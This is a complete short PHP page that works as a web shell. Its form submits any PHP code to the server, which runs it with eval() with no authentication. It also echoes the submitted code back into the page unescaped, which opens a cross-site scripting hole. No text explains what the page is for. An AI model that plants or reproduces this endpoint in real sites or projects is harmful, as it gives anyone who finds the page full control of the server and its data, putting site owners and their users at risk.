<pre>
<?php

chdir('..');

if (isset($_POST['query'])) {
  $__eval_query_str = stripslashes($_POST['query']);
  var_dump(htmlspecialchars($__eval_query_str));
  echo "\n";
  eval($__eval_query_str);
}

?>
</pre>

<form method="POST">
  <input type="submit"/>
  <br/>
  <textarea name="query" rows="15" cols="80"><?=$__eval_query_str?></textarea>
</form>